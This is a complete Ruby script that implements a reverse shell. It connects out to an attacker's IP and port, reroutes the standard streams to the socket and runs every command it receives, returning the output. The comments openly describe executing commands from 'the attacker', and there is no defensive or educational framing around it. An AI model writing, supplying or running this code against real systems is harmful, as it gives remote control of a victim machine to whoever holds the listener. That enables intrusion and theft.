require 'socket'

class ReverseShell
  def initialize(ip, port)
    @ip = ip
    @port = port
  end

  def connect
    begin
      socket = TCPSocket.new(@ip, @port)
      # Redirect input, output, and error streams to the socket
      $stdin.reopen(socket)
      $stdout.reopen(socket)
      $stderr.reopen(socket)  
      # Run commands received from the attacker
      while command = socket.gets
        output = `#{command}` # Execute the command
        socket.puts output # Send the output back
      end
    rescue => e
      puts "Error: #{e.message}" 
    ensure
      socket.close if socket
    end
  end
end

# Example usage:
if ARGV.length < 2
  puts "Usage: ruby reverse_shell.rb <IP> <PORT>"
  exit
end
ip = ARGV[0]
port = ARGV[1].to_i

shell = ReverseShell.new(ip, port)
shell.connect
